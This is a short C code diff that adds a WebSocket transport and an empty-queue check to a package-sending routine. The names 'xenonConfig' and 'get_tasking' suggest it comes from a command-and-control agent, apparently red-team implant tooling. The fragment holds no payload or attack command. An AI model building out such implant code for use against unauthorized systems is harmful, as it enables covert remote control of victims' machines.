@@ -439,6 +439,9 @@ BOOL PackageSendAll(PPARSER response)
 #ifdef TCP_TRANSPORT
     #define MAX_PACKAGE_SIZE (PIPE_BUFFER_MAX * 3 / 4)     // ~48 KB
 #endif
+#ifdef WEBSOCKET_TRANSPORT
+    #define MAX_PACKAGE_SIZE (MAX_REQUEST_LENGTH * 3 / 4)  // ~2.25MB
+#endif
 
     _dbg("Sending All Queued Packages to Server ...");
 
@@ -460,6 +463,13 @@ BOOL PackageSendAll(PPARSER response)
 #ifdef TCP_TRANSPORT
 
     /* Nothing to send */
+    if ( !xenonConfig->PackageQueue )
+        return TRUE;
+
+#endif
+#ifdef WEBSOCKET_TRANSPORT
+
+    /* Push: never send empty get_tasking polls */
     if ( !xenonConfig->PackageQueue )
         return TRUE;
 
